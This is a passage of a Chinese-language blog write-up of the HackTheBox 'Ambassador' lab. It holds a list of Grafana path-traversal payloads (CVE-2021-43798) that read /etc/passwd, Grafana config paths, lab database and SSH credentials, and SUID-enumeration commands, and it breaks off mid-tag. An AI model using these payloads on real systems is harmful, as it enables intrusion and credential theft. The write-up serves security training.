@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Ambassador - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Ambassador - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/02/Ambassador/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T10:33:48.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/HackTheBox/">HackTheBox</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">Ambassador</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676560511004-b4ddbb01-d647-42b1-b418-42a1b0631e3e.png#averageHue=%23181f28&clientId=u51e10fcf-d949-4&from=paste&height=704&id=ue81a76aa&name=image.png&originHeight=880&originWidth=1608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=251335&status=done&style=none&taskId=u13a0806a-1628-49a2-9c93-2925e971984&title=&width=1286.4" alt="image.png"></p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
+<li>Grafana任意文件读取</li>
+<li>Grafana  配置文件Path</li>
+<li>Git回退</li>
+<li>Consoul 健康检查提权</li>
+<li>SSL端口转发</li>
+</ul>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>Nmap嗦一口看看开放端口<br><code>nmap -sC -sV -Pn 10.10.11.183 </code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.183 (10.10.11.183)</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)</span><br><span class="line">|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)</span><br><span class="line">|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Hugo 0.94.2</span><br><span class="line">|_http-title: Ambassador Development Server</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Cache-Control: no-cache</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Expires: -1</span><br><span class="line">|     Location: /login</span><br><span class="line">|     Pragma: no-cache</span><br><span class="line">|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: deny</span><br><span class="line">|     X-Xss-Protection: 1; mode=block</span><br><span class="line">|     Date: Thu, 16 Feb 2023 15:17:43 GMT</span><br><span class="line">|     Content-Length: 29</span><br><span class="line">|     href=&quot;/login&quot;&gt;Found&lt;/a&gt;.</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Cache-Control: no-cache</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Expires: -1</span><br><span class="line">|     Location: /login</span><br><span class="line">|     Pragma: no-cache</span><br><span class="line">|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: deny</span><br><span class="line">|     X-Xss-Protection: 1; mode=block</span><br><span class="line">|     Date: Thu, 16 Feb 2023 15:16:55 GMT</span><br><span class="line">|     Content-Length: 29</span><br><span class="line">|     href=&quot;/login&quot;&gt;Found&lt;/a&gt;.</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Cache-Control: no-cache</span><br><span class="line">|     Expires: -1</span><br><span class="line">|     Location: /login</span><br><span class="line">|     Pragma: no-cache</span><br><span class="line">|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: deny</span><br><span class="line">|     X-Xss-Protection: 1; mode=block</span><br><span class="line">|     Date: Thu, 16 Feb 2023 15:17:03 GMT</span><br><span class="line">|_    Content-Length: 0</span><br><span class="line">3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_8.0.28_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2022-03-13T22:27:05</span><br><span class="line">|_Not valid after:  2032-03-10T22:27:05</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 8.0.30-0ubuntu0.20.04.2</span><br><span class="line">|   Thread ID: 179</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, LongColumnFlag, LongPassword, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, ODBCClient, FoundRows, ConnectWithDatabase, SupportsTransactions, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: zp;Fb.KEpyx\x14R4NH\x02=|q</span><br><span class="line">|_  Auth Plugin Name: caching_sha2_password</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>开放了3306、3000、80、22四个端口，访问<code>http://10.10.11.183</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676560878955-1c86f5b6-f040-4e85-9832-c747c299e656.png#averageHue=%23aaaaaa&clientId=u51e10fcf-d949-4&from=paste&height=686&id=u4a5b9f9a&name=image.png&originHeight=858&originWidth=1660&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94580&status=done&style=none&taskId=ucd7449c1-3576-45b7-899e-ae1a77d3d44&title=&width=1328" alt="image.png"></p>
+<h1 id="Grafana任意文件读取"><a href="#Grafana任意文件读取" class="headerlink" title="Grafana任意文件读取"></a>Grafana任意文件读取</h1><p>意思是让我们获取ssh的账号，后续扫描了网站的目录，没有可疑路径，因此把重心放在3000端口，这是一个grafana服务端：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561466927-ea6d1134-6c88-4baf-82d7-5b5bf2aa9de3.png#averageHue=%23281d3b&clientId=u51e10fcf-d949-4&from=paste&height=707&id=u0c9f5126&name=image.png&originHeight=884&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=316385&status=done&style=none&taskId=u6f4c4300-55d2-47d4-8ed8-50f53ac2075&title=&width=1371.2" alt="image.png"></p>
+<blockquote>
+<p>Introduction：<br>Grafana是一个跨平台的开源的度量分析和可视化工具，可以通过将采集的数据查询然后可视化的展示，并及时通知。</p>
+<p>主要特点<br>展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式；<br>数据源:Prometheus、InfluxDB、Elasticsearch、Mysql、Microsoft SQL Server、Oracle等；<br>注释：使用来自不同数据源的丰富事件注释图表，将鼠标悬停在事件上会显示完整的事件元数据和标记；<br>混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源；<br>过滤器：Ad-hoc过滤器允许动态创建新的键&#x2F;值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。<br>通知提醒：以可视方式定义最重要指标的警报规则，Grafana将不断计算并发送通知，在数据达到阈值时通过Slack、PagerDuty等获得通知；</p>
+</blockquote>
+<p>由于之前CTF题中见到过有关题型，Grafana好像在前几年被爆出了一个任意文件读取的漏洞<br>(CVE-2021-43798)：</p>
+<p>poc如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertmanager/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mixed/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashboard/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertGroups/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/debug/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/live/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/canvas/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/xychart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>随便选取一个基本都可以任意文件读取：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561092396-ffefc3ee-8d66-4025-88b3-19b57691f91f.png#averageHue=%23f7f7f7&clientId=u51e10fcf-d949-4&from=paste&height=561&id=ucc1100db&name=image.png&originHeight=701&originWidth=1277&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135500&status=done&style=none&taskId=u81716367-00aa-4c94-ae9f-21b09293cd0&title=&width=1021.6" alt="image.png"><br>我们利用这一点去读取一些配置文件信息：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41181590/article/details/107658141">https://blog.csdn.net/qq_41181590&#x2F;article&#x2F;details&#x2F;107658141</a><br>常见的配置文件地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">安装目录</span><br><span class="line">/usr/share/grafana/</span><br><span class="line">grafana-cli 路径</span><br><span class="line">/usr/share/grafana/bin/grafana-cli</span><br><span class="line">全局配置文件</span><br><span class="line">/etc/grafana/grafana.ini</span><br><span class="line">默认配置文件</span><br><span class="line">/usr/share/grafana/conf/defaults.ini</span><br><span class="line">plugins 安装目录</span><br><span class="line">/var/lib/grafana/plugins/</span><br><span class="line">默认数据存储文件路径</span><br><span class="line">/var/lib/grafana/grafana.db</span><br><span class="line">日志文件存储路径</span><br><span class="line">/var/log/grafana/</span><br><span class="line">邮件默认发送模板路径</span><br><span class="line">/usr/share/grafana/public/emails/</span><br></pre></td></tr></table></figure>
+<p>我们可以读取全局配置文件，看看能不能登录进grafana：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561566554-4ca5f260-ca79-4b47-873a-c0f3dd7dac34.png#averageHue=%23fafafa&clientId=u51e10fcf-d949-4&from=paste&height=606&id=u29d0ec5d&name=image.png&originHeight=757&originWidth=1689&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134793&status=done&style=none&taskId=u605c1851-0927-4edc-8f13-d3b79192632&title=&width=1351.2" alt="image.png"><br>发现了管理员账号密码，结果成功进入admin panel：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561669597-6840fc71-2c3d-4696-9022-8524226cfd3c.png#averageHue=%231b1e23&clientId=u51e10fcf-d949-4&from=paste&height=530&id=Glxxd&name=image.png&originHeight=663&originWidth=1737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89830&status=done&style=none&taskId=ue66ecc39-e684-4f77-8491-023fb6e8518&title=&width=1389.6" alt="image.png"><br>并且在设置界面发现了mysql.yaml配置文件，只不过我们不能读出来，在官方文档可以知道其所在路径：<br><a target="_blank" rel="noopener" href="https://grafana.com/docs/grafana/latest/administration/provisioning/#data-sources">https://grafana.com/docs/grafana/latest/administration/provisioning/#data-sources</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561714797-ebe7d2df-df68-4a02-b64e-872ecd857cba.png#averageHue=%23c0d3bd&clientId=u51e10fcf-d949-4&from=paste&height=570&id=uf08f6d91&name=image.png&originHeight=712&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=261498&status=done&style=none&taskId=u10ca2250-147d-4c15-889b-1e05ea78d9d&title=&width=1534.4" alt="image.png"><br>所以利用任意文件读取，读取yaml文件<code>/etc/grafana/[provisioning/datasources](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#provisioning)/mysql.yaml</code>文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561805676-e595ebb5-5260-4aaa-bc53-d082159e80b7.png#averageHue=%23fbfbfb&clientId=u51e10fcf-d949-4&from=paste&height=164&id=u78cfadc7&name=image.png&originHeight=205&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45250&status=done&style=none&taskId=uac60c90a-8de1-481d-b2a1-d5e3e18147c&title=&width=1122.4" alt="image.png"></p>
+<h2 id="Sqlite3直接导入db文件读取密码"><a href="#Sqlite3直接导入db文件读取密码" class="headerlink" title="Sqlite3直接导入db文件读取密码"></a>Sqlite3直接导入db文件读取密码</h2><p>除了上面读取配置文件，还可以先读取<code>/var/lib/grafana/grafana.db</code>，在将db文件用sqlite3打开，这样也是可以获取mysql用户密码的</p>
+<h1 id="Mysql获取ssh密码"><a href="#Mysql获取ssh密码" class="headerlink" title="Mysql获取ssh密码"></a>Mysql获取ssh密码</h1><p>获得了mysql数据的账号密码，直接远程连接数据库<code>mysql -h 10.10.11.183 -P 3306 -ugrafana -pdontStandSoCloseToMe63221!</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561886090-1d8958a9-7977-4cfa-985c-04147592dcfb.png#averageHue=%2326282f&clientId=u51e10fcf-d949-4&from=paste&height=201&id=ua22ac82b&name=image.png&originHeight=251&originWidth=1154&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22669&status=done&style=none&taskId=ue170d9e1-c244-41c6-823e-4cfb70f2e13&title=&width=923.2" alt="image.png"><br>发现可疑数据库<code>whackywidget </code>，在里面找到了一组ssh账号密码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676561930088-e4c53c08-1599-4c89-afdf-f974f48800a7.png#averageHue=%232a2c33&clientId=u51e10fcf-d949-4&from=paste&height=139&id=u45608236&name=image.png&originHeight=174&originWidth=662&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18870&status=done&style=none&taskId=u92c36775-6373-4b94-b344-af65733962c&title=&width=529.6" alt="image.png"><br>密码经过base64解密后为<code>developer/anEnglishManInNewYork027468</code>，之后可以直接ssh远程连接：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562064219-5153a9a3-850f-4d49-b588-571b88bf8a29.png#averageHue=%23479f91&clientId=u51e10fcf-d949-4&from=paste&height=66&id=u9236d07b&name=image.png&originHeight=83&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15215&status=done&style=none&taskId=uf0fd22d0-5890-4ff9-81df-9ae4ebfd4eb&title=&width=994.4" alt="image.png"><br>获取user flag</p>
+<h1 id="Consoul服务提权"><a href="#Consoul服务提权" class="headerlink" title="Consoul服务提权"></a>Consoul服务提权</h1><p>进入之后首先就看看能不能suid提权嘛：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562252986-5100a088-c050-4b03-a385-29691f7f5382.png#averageHue=%23272a31&clientId=u51e10fcf-d949-4&from=paste&height=261&id=u5ad7275e&name=image.png&originHeight=326&originWidth=1135&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46147&status=done&style=none&taskId=ue46ab028-29bb-4486-a73d-90764c1c6de&title=&width=908" alt="image.png"><br>并没有可利用指令，然后查看内核漏洞：<br><code>uname -a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562312351-db2fa70a-b9d0-48ce-bb17-1b726e3b8f86.png#averageHue=%232a2f35&clientId=u51e10fcf-d949-4&from=paste&height=67&id=u8b1263c8&name=image.png&originHeight=84&originWidth=1040&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17525&status=done&style=none&taskId=u5386bbff-bc52-4361-83a3-6f6d8eea7f3&title=&width=832" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562325008-338c9653-0d97-44e2-a945-0d0d2804c909.png#averageHue=%23303238&clientId=u51e10fcf-d949-4&from=paste&height=378&id=u55445847&name=image.png&originHeight=472&originWidth=1101&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=177870&status=done&style=none&taskId=u6085a0b5-03f6-4319-a4d1-52d3a1b39e6&title=&width=880.8" alt="image.png"><br>也并没有发现内核漏洞，到这里一般就寄了嘛，但是我们在<code>/opt/my-app/whackywidget</code>路径可以发现一些有用的信息：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562433741-8a3348cc-919d-4b7e-99cf-9dc12074899e.png#averageHue=%232a2e36&clientId=u51e10fcf-d949-4&from=paste&height=105&id=u1f397dd8&name=image.png&originHeight=131&originWidth=1091&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35192&status=done&style=none&taskId=u1bcac31a-a724-43b7-92e6-1e151c39afe&title=&width=872.8" alt="image.png"><br>这是一个consul服务的指令,什么是consul服务呢？</p>
+<blockquote>
+<p>. Consul是一个服务网格解决方案，提供了一个功能齐全的控制平面，具有服务发现、配置和分段功能。 这些功能中的每一项都可以根据需要单独使用，也可以一起使用来构建一个完整的服务网格。 Consul需要一个数据平面，并支持代理和原生集成模型。</p>
+</blockquote>
+<p>consul服务内置了一些指令可以参考：<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000019424215">https://segmentfault.com/a/1190000019424215</a><br><a target="_blank" rel="noopener" href="https://developer.hashicorp.com/consul/docs/security/acl/acl-tokens#creating-tokens">https://developer.hashicorp.com/consul/docs/security/acl/acl-tokens#creating-tokens</a><br>但是今天我们用到的是<code>health check</code>，健康检查，consul服务启动时会调用一些脚本进行探测服务健康状况，因此这里可能可以构造恶意的health check文件<br>上面文件内容说需要<code>CONSUL_HTTP_TOKEN </code>才能运行consul指令，因此现在的思路就是寻找TOKEN</p>
+<h2 id="Git-版本倒退"><a href="#Git-版本倒退" class="headerlink" title="Git 版本倒退"></a>Git 版本倒退</h2><p>在<code>my-app</code>目录下发现.git文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562835962-323d3c67-e41a-4515-8025-2691108d41c7.png#averageHue=%232a2d35&clientId=u51e10fcf-d949-4&from=paste&height=138&id=uc7f61f0f&name=image.png&originHeight=173&originWidth=785&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36011&status=done&style=none&taskId=uf0037f27-3808-48e1-9bc9-d771e27ca87&title=&width=628" alt="image.png"><br><code>git log</code>查看git版本：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676562859452-d2dce1c4-0acd-4d45-ac76-bebf4ae52a47.png#averageHue=%23272930&clientId=u51e10fcf-d949-4&from=paste&height=371&id=u977587cc&name=image.png&originHeight=464&originWidth=1120&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76817&status=done&style=none&taskId=ub358a0ae-3426-4daf-8836-a1659221a76&title=&width=896" alt="image.png"><br>由于目录权限问题无法使用git checkout指令切换分值，因此我们需要将my-app目录转移到有write权限的tmp目录下<br><code>cp ../my-app /tmp/regit</code>:<br><img 